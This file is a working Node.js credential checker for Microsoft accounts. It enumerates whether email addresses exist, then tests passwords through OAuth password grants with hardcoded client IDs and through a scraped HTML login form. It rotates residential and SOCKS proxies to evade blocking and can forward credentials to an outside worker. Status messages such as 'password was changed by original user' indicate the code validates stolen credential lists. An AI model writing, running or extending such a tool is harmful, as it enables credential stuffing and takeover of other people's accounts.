/**
 * Microsoft checker with optional proxy (required for reliable password checks on Render).
 *
 * Env:
 *   MS_CHECK_PROXY=http://user:pass@host:port
 *   HTTPS_PROXY / HTTP_PROXY also work
 *   PASS_WORKER_URL=https://selenium-worker  (best)
 *
 * Messages:
 *   This Email doesn't exist
 *   Not loginable
 *   password was changed by original user
 *   Login OK
 */
const MSG = {
  NO_EMAIL: "This Email doesn't exist",
  NOT_LOGINABLE: 'Not loginable',
  PASS_CHANGED: 'password was changed by original user',
  OK: 'Login OK'
};

const UA =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

let _proxyReady = false;
let _proxyList = []; // full proxy URLs
let _proxyIndex = 0;
let _socksAgent = null;
let _httpDispatcher = null;
let _activeProxy = '';

function parseProxyLine(line) {
  line = String(line || '').trim();
  if (!line) return null;
  if (/^socks/i.test(line) || /^https?:\/\//i.test(line)) return line;
  // host:port:user:pass
  const parts = line.split(':');
  if (parts.length >= 4) {
    const host = parts[0];
    const port = parts[1];
    const user = parts[2];
    const pass = parts.slice(3).join(':'); // password may contain :
    return 'http://' + encodeURIComponent(user) + ':' + encodeURIComponent(pass) + '@' + host + ':' + port;
  }
  if (parts.length === 2) return 'http://' + parts[0] + ':' + parts[1];
  return null;
}

function loadProxyList() {
  const raw =
    process.env.MS_CHECK_PROXIES ||
    process.env.MS_CHECK_PROXY ||
    process.env.HTTPS_PROXY ||
    process.env.HTTP_PROXY ||
    '';
  const lines = String(raw)
    .split(/[\n,;]+/)
    .map((s) => s.trim())
    .filter(Boolean);
  const list = [];
  for (const line of lines) {
    const u = parseProxyLine(line);
    if (u) list.push(u);
  }
  return list;
}

function safeProxy(url) {
  return String(url || '').replace(/\/\/.*:.*@/, '//***:***@');
}

function initProxy() {
  if (_proxyReady) return;
  _proxyReady = true;
  _proxyList = loadProxyList();
  if (!_proxyList.length) {
    console.log('[msCheck] No proxy set (MS_CHECK_PROXIES / MS_CHECK_PROXY)');
    return;
  }
  console.log('[msCheck] Loaded', _proxyList.length, 'proxies');
  selectProxy(0);
}

function selectProxy(index) {
  if (!_proxyList.length) return;
  _proxyIndex = index % _proxyList.length;
  _activeProxy = _proxyList[_proxyIndex];
  _socksAgent = null;
  _httpDispatcher = null;

  const isSocks = /^socks/i.test(_activeProxy);
  if (isSocks) {
    try {
      const { SocksProxyAgent } = require('socks-proxy-agent');
      _socksAgent = new SocksProxyAgent(_activeProxy);
      console.log('[msCheck] SOCKS', _proxyIndex + 1 + '/' + _proxyList.length, safeProxy(_activeProxy));
    } catch (e) {
      console.error('[msCheck] socks-proxy-agent error:', e.message);
    }
    return;
  }
  try {
    const undici = require('undici');
    _httpDispatcher = new undici.ProxyAgent(_activeProxy);
    console.log('[msCheck] HTTP', _proxyIndex + 1 + '/' + _proxyList.length, safeProxy(_activeProxy));
  } catch (e) {
    console.error('[msCheck] HTTP proxy error:', e.message);
  }
}

function rotateProxy() {
  if (_proxyList.length < 2) return false;
  selectProxy(_proxyIndex + 1);
  return true;
}

function headersToObject(headers) {
  const out = { 'User-Agent': UA };
  if (!headers) return out;
  if (typeof headers.forEach === 'function') {
    headers.forEach((v, k) => {
      out[k] = v;
    });
  } else {
    Object.assign(out, headers);
  }
  return out;
}

async function msFetch(url, opts = {}) {
  initProxy();
  const method = (opts.method || 'GET').toUpperCase();
  const headers = headersToObject(opts.headers);
  const body = opts.body;
  const redirect = opts.redirect || 'follow';
  let current = url;
  let hops = 0;
  let useMethod = method;
  let useBody = body;

  while (hops < 8) {
    hops++;
    let res;
    if (_socksAgent) {
      res = await socksRequest(current, useMethod, headers, useBody);
    } else if (_httpDispatcher) {
      const undici = require('undici');
      res = await undici.fetch(current, {
        method: useMethod,
        headers,
        body: useBody,
        redirect: 'manual',
        dispatcher: _httpDispatcher
      });
    } else {
      res = await fetch(current, { method: useMethod, headers, body: useBody, redirect: 'manual' });
    }

    const status = res.status;
    const loc = res.headers.get('location');
    if (redirect === 'follow' && status >= 300 && status < 400 && loc) {
      current = new URL(loc, current).toString();
      if (status !== 307 && status !== 308) {
        useMethod = 'GET';
        useBody = undefined;
      }
      continue;
    }
    return res;
  }
  throw new Error('Too many redirects');
}

function socksRequest(urlStr, method, headers, body) {
  const http = require('http');
  const https = require('https');
  const { URL } = require('url');
  const u = new URL(urlStr);
  const isHttps = u.protocol === 'https:';
  const lib = isHttps ? https : http;
  const payload = body == null ? null : Buffer.from(String(body), 'utf8');
  const hdrs = Object.assign({}, headers);
  if (payload && !hdrs['Content-Length'] && !hdrs['content-length']) {
    hdrs['Content-Length'] = String(payload.length);
  }
  return new Promise((resolve, reject) => {
    const req = lib.request(
      {
        hostname: u.hostname,
        port: u.port || (isHttps ? 443 : 80),
        path: u.pathname + u.search,
        method,
        headers: hdrs,
        agent: _socksAgent,
        timeout: 45000
      },
      (inc) => {
        const chunks = [];
        inc.on('data', (c) => chunks.push(c));
        inc.on('end', () => {
          const buf = Buffer.concat(chunks);
          const rawHeaders = inc.headers || {};
          resolve({
            ok: inc.statusCode >= 200 && inc.statusCode < 300,
            status: inc.statusCode,
            headers: {
              get(name) {
                const v = rawHeaders[String(name).toLowerCase()];
                return Array.isArray(v) ? v[0] : v || null;
              },
              getSetCookie() {
                const sc = rawHeaders['set-cookie'];
                if (!sc) return [];
                return Array.isArray(sc) ? sc : [sc];
              }
            },
            async text() {
              return buf.toString('utf8');
            },
            async json() {
              return JSON.parse(buf.toString('utf8') || '{}');
            }
          });
        });
      }
    );
    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('SOCKS proxy timeout'));
    });
    if (payload) req.write(payload);
    req.end();
  });
}

function cleanEmail(e) {
  return String(e || '').trim().toLowerCase();
}

function pickCookies(res) {
  try {
    if (typeof res.headers.getSetCookie === 'function') {
      const arr = res.headers.getSetCookie();
      if (arr && arr.length) return arr.map((c) => c.split(';')[0]).join('; ');
    }
  } catch (_) {}
  const sc = res.headers.get('set-cookie');
  if (!sc) return '';
  return sc
    .split(/,(?=\s*[^;=]+=)/)
    .map((c) => c.split(';')[0].trim())
    .join('; ');
}

function mergeCookie(a, b) {
  const map = {};
  for (const src of [a, b]) {
    String(src || '')
      .split(';')
      .map((s) => s.trim())
      .filter(Boolean)
      .forEach((p) => {
        const i = p.indexOf('=');
        if (i > 0) map[p.slice(0, i)] = p.slice(i + 1);
      });
  }
  return Object.entries(map)
    .map(([k, v]) => k + '=' + v)
    .join('; ');
}


/** Existence check without proxy (works more often on free tier) */
async function getCredentialTypeDirect(email) {
  const res = await fetch('https://login.live.com/GetCredentialType.srf?mkt=EN-US&id=292841', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      Accept: 'application/json',
      'User-Agent': UA,
      Origin: 'https://login.live.com',
      Referer: 'https://login.live.com/'
    },
    body: JSON.stringify({
      username: email,
      uaid: '',
      isOtherIdpSupported: true,
      checkPhones: false,
      isRemoteNGCSupported: true,
      isCookieBannerShown: false,
      isFidoSupported: true,
      forceotclogin: false,
      otclogindisallowed: false,
      isExternalFederationDisallowed: false,
      isRemoteConnectSupported: false,
      federationFlags: 0,
      isSignup: false,
      flowToken: ''
    })
  });
  const data = await res.json().catch(() => null);
  return { data, http: res.status };
}

async function getCredentialType(email) {
  let cookies = '';
  try {
    const warm = await msFetch('https://login.live.com/login.srf?wa=wsignin1.0&mkt=EN-US&id=292841', {
      headers: { Accept: 'text/html' },
      redirect: 'follow'
    });
    cookies = pickCookies(warm);
  } catch (_) {}

  const res = await msFetch('https://login.live.com/GetCredentialType.srf?mkt=EN-US&id=292841', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      Accept: 'application/json',
      Cookie: cookies,
      Origin: 'https://login.live.com',
      Referer: 'https://login.live.com/'
    },
    body: JSON.stringify({
      username: email,
      uaid: '',
      isOtherIdpSupported: true,
      checkPhones: false,
      isRemoteNGCSupported: true,
      isCookieBannerShown: false,
      isFidoSupported: true,
      forceotclogin: false,
      otclogindisallowed: false,
      isExternalFederationDisallowed: false,
      isRemoteConnectSupported: false,
      federationFlags: 0,
      isSignup: false,
      flowToken: ''
    })
  });
  const data = await res.json().catch(() => null);
  cookies = mergeCookie(cookies, pickCookies(res));
  return { data, cookies, http: res.status };
}

function fromCredentialType(data) {
  if (!data || typeof data !== 'object') return { known: false };
  const code = data.IfExistsResult;
  if (code === 1 || code === 4) {
    return { known: true, exists: false, msg: MSG.NO_EMAIL };
  }
  if (code !== 0 && code !== 2 && code !== 5 && code !== 6) {
    return { known: false, code };
  }
  const creds = data.Credentials || {};
  if (creds.FederationRedirectUrl && creds.HasPassword === false) {
    return { known: true, exists: true, hasPassword: false, msg: MSG.NOT_LOGINABLE };
  }
  if (creds.HasPassword === false) {
    return { known: true, exists: true, hasPassword: false, msg: MSG.NOT_LOGINABLE };
  }
  return {
    known: true,
    exists: true,
    hasPassword: creds.HasPassword === true || creds.HasPassword === undefined,
    preferOther: creds.PrefCredential != null && creds.PrefCredential !== 0
  };
}

function mapOauthData(data, http) {
  if (http === 200 && (data.access_token || data.refresh_token)) {
    return { definitive: true, ok: true, msg: MSG.OK };
  }
  const codes = [].concat(data.error_codes || []).map(String);
  const desc = String(data.error_description || data.error_message || data.message || data.error || '');
  const blob = (codes.join(' ') + ' ' + desc).toLowerCase();

  if (codes.includes('50034') || /aadsts50034|user account does not exist|user not found/i.test(blob)) {
    return { definitive: true, ok: false, msg: MSG.NO_EMAIL };
  }
  if (
    codes.includes('50126') ||
    /aadsts50126|invalid username or password|password is incorrect/i.test(blob)
  ) {
    return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
  }
  if (
    codes.some((c) => ['50076', '50079', '50072', '50158', '50140', '53003', '53004', '50097'].includes(c)) ||
    /aadsts50076|aadsts50079|multi-factor|mfa required|strong authentication|proofup/i.test(blob)
  ) {
    return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
  }
  if (codes.some((c) => ['50057', '50005', '50053'].includes(c)) || /account is locked|disabled/i.test(blob)) {
    return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
  }
  return { definitive: false, raw: desc.slice(0, 200) };
}

async function oauthTry(email, password, clientId, tokenUrl, scope) {
  const body = new URLSearchParams({
    grant_type: 'password',
    client_id: clientId,
    username: email,
    password: password,
    scope: scope
  });
  if (tokenUrl.includes('login.live.com')) {
    body.set('redirect_uri', 'https://login.live.com/oauth20_desktop.srf');
  }
  const res = await msFetch(tokenUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Accept: 'application/json'
    },
    body: body.toString()
  });
  const data = await res.json().catch(() => ({}));
  return mapOauthData(data, res.status);
}

/** Full HTML password login (works through residential proxy) */
async function htmlPasswordCheck(email, password, seedCookies) {
  const loginUrl = 'https://login.live.com/login.srf?wa=wsignin1.0&mkt=en-US&id=292841';
  const pageRes = await msFetch(loginUrl, {
    headers: {
      Accept: 'text/html',
      Cookie: seedCookies || '',
      'Accept-Language': 'en-US,en;q=0.9'
    },
    redirect: 'follow'
  });
  const html = await pageRes.text();
  let cookies = mergeCookie(seedCookies, pickCookies(pageRes));

  const ppft =
    (html.match(/name="PPFT"[^>]*value="([^"]+)"/i) || [])[1] ||
    (html.match(/"sFT":"([^"]+)"/i) || [])[1] ||
    (html.match(/sFT:'([^']+)'/i) || [])[1] ||
    '';

  let urlPost =
    (html.match(/urlPost:"([^"]+)"/i) || [])[1] ||
    (html.match(/urlPost:'([^']+)'/i) || [])[1] ||
    'https://login.live.com/ppsecure/post.srf';
  urlPost = urlPost.replace(/\\u0026/g, '&').replace(/\\\//g, '/');

  if (!ppft) return { definitive: false, reason: 'no_ppft' };

  const form = new URLSearchParams({
    login: email,
    loginfmt: email,
    passwd: password,
    PPFT: ppft,
    type: '11',
    LoginOptions: '3',
    NewUser: '1',
    PPSX: 'Passp',
    ps: '2',
    i13: '0',
    i19: '12000',
    IsFidoSupported: '1'
  });

  const postRes = await msFetch(urlPost, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: cookies,
      Origin: 'https://login.live.com',
      Referer: loginUrl
    },
    body: form.toString(),
    redirect: 'manual'
  });

  const loc = postRes.headers.get('location') || '';
  const body = await postRes.text().catch(() => '');
  const all = (body + '\n' + loc).toLowerCase();

  if (/account\.microsoft\.com|office\.com|onedrive|completesignin|oauth20/i.test(loc)) {
    if (/proof|identity|otp|securitycode|interrupt/i.test(loc + body)) {
      return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
    }
    return { definitive: true, ok: true, msg: MSG.OK };
  }
  if (/password is incorrect|account or password is incorrect|serrorcode["\s:]*["']?80041012/i.test(all)) {
    return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
  }
  if (/that microsoft account doesn'?t exist|we couldn'?t find an account/i.test(all)) {
    return { definitive: true, ok: false, msg: MSG.NO_EMAIL };
  }
  // Other ways page: if password was offered and failed, or only code
  if (/other ways to sign in|sign in another way|use a code|authenticator|verify your identity/i.test(all)) {
    if (/name="passwd"|type="password"/i.test(body)) {
      // password form still there — treat incorrect as pass changed if error text
      const err = (body.match(/id="passwordError"[^>]*>([^<]+)</i) || [])[1] || '';
      if (/incorrect|wrong/i.test(err)) return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
      // Has password field under other ways → try was done; no clear error
      return { definitive: false, reason: 'other_ways_with_password_field' };
    }
    return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
  }

  if (postRes.status === 200 && /name="passwd"/i.test(body)) {
    const err =
      (body.match(/id="passwordError"[^>]*>([^<]+)</i) || [])[1] ||
      (body.match(/id="usernameError"[^>]*>([^<]+)</i) || [])[1] ||
      '';
    if (/incorrect|wrong/i.test(err)) return { definitive: true, ok: false, msg: MSG.PASS_CHANGED, raw: err };
    if (/doesn'?t exist|couldn'?t find/i.test(err)) return { definitive: true, ok: false, msg: MSG.NO_EMAIL, raw: err };
  }

  return { definitive: false, reason: 'html_inconclusive', http: postRes.status };
}

async function tryWorker(email, password) {
  const base = String(process.env.PASS_WORKER_URL || '').replace(/\/$/, '');
  if (!base) return null;
  try {
    const res = await msFetch(base + '/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, type: 'check' })
    });
    return await res.json().catch(() => null);
  } catch (e) {
    return { error: e.message };
  }
}

function mapWorker(data) {
  if (!data) return null;
  if (data.ok === true || data.status === 'success') {
    return { ok: true, summary: MSG.OK, error: null };
  }
  const err = String(data.error || data.message || data.result || '').toLowerCase();
  if (!err) return null;
  if (/50034|not exist|doesn'?t exist|no account/.test(err)) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL };
  }
  if (/50126|incorrect|wrong password|invalid username or password/.test(err)) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED };
  }
  if (/50076|50079|mfa|2fa|authenticator|not loginable|no password|otp/.test(err)) {
    return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE };
  }
  return null;
}

async function checkMicrosoft(email, password) {
  initProxy();
  email = cleanEmail(email);
  password = String(password || '');
  const details = { proxies: _proxyList.length, steps: [] };

  if (!email.includes('@')) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
  }
  if (!password) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED, details };
  }

  const worker = await tryWorker(email, password);
  if (worker) {
    details.worker = worker;
    const m = mapWorker(worker);
    if (m) return { ...m, details };
  }

  // Free: try GetCredentialType direct (no proxy) — existence often works from Render
  try {
    const directCt = await getCredentialTypeDirect(email);
    details.directCt = directCt.data;
    const info = fromCredentialType(directCt.data);
    details.exists = info;
    details.steps.push('direct-ct');
    if (info.known && info.exists === false) {
      return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
    }
    if (info.msg === MSG.NOT_LOGINABLE && info.hasPassword === false) {
      return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
    }
  } catch (e) {
    details.directCtError = e.message;
  }

  const maxRounds = Math.max(1, _proxyList.length || 1);
  let lastUnknown = null;

  for (let round = 0; round < maxRounds; round++) {
    if (round > 0) rotateProxy();
    details.proxyUsed = safeProxy(_activeProxy || 'direct');
    details.steps.push('round ' + (round + 1) + ' ' + details.proxyUsed);

    let ctInfo = { known: false };
    let cookies = '';
    try {
      const ct = await getCredentialType(email);
      details.credentialType = ct.data;
      cookies = ct.cookies || '';
      ctInfo = fromCredentialType(ct.data);
      details.exists = ctInfo;
      if (ctInfo.known && ctInfo.exists === false) {
        return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
      }
      if (ctInfo.msg === MSG.NOT_LOGINABLE && ctInfo.hasPassword === false) {
        return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
      }
    } catch (e) {
      details.ctError = e.message;
      details.steps.push('ct fail: ' + e.message);
      continue; // try next proxy
    }

    const clients = [
      ['000000004C12AE6F', 'https://login.live.com/oauth20_token.srf', 'service::user.auth.xboxlive.com::MBI_SSL'],
      ['00000000402b5328', 'https://login.live.com/oauth20_token.srf', 'service::user.auth.xboxlive.com::MBI_SSL'],
      ['1f907974-e22b-4810-a9de-d282292ec59c', 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token', 'openid offline_access'],
      ['d3590ed6-52b3-4102-aeff-aad2292ab01c', 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token', 'openid offline_access']
    ];
    let definitive = null;
    for (const [id, url, scope] of clients) {
      try {
        const r = await oauthTry(email, password, id, url, scope);
        details.steps.push({ oauth: id, def: r.definitive, msg: r.msg });
        if (r.definitive) {
          definitive = r;
          break;
        }
      } catch (e) {
        details.steps.push({ oauth: id, err: e.message });
      }
    }
    if (definitive) {
      return {
        ok: !!definitive.ok,
        summary: definitive.msg,
        error: definitive.ok ? null : definitive.msg,
        details
      };
    }

    try {
      const html = await htmlPasswordCheck(email, password, cookies);
      details.html = html;
      if (html.definitive) {
        return { ok: !!html.ok, summary: html.msg, error: html.ok ? null : html.msg, details };
      }
    } catch (e) {
      details.htmlError = e.message;
      details.steps.push('html fail: ' + e.message);
    }

    if (ctInfo.known && ctInfo.exists && ctInfo.hasPassword === false) {
      return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
    }

    lastUnknown = details.proxyUsed;
  }

  // Free path: still return useful existence info when we have it
  if (details.exists && details.exists.known) {
    if (details.exists.exists === false) {
      return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
    }
    if (details.exists.hasPassword === false) {
      return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
    }
    if (details.exists.exists === true) {
      const msg =
        'Account exists — password could not be verified on free/datacenter IPs. ' +
        'Use a residential proxy or PASS_WORKER_URL for full password check.';
      return { ok: false, summary: msg, error: msg, details };
    }
  }

  const tip =
    'Could not reach Microsoft login from free proxies. ' +
    'Email existence also unknown. Try again later or use residential / worker.';
  return { ok: false, summary: tip, error: tip, details: { ...details, lastUnknown } };
}


module.exports = { checkMicrosoft, MSG };
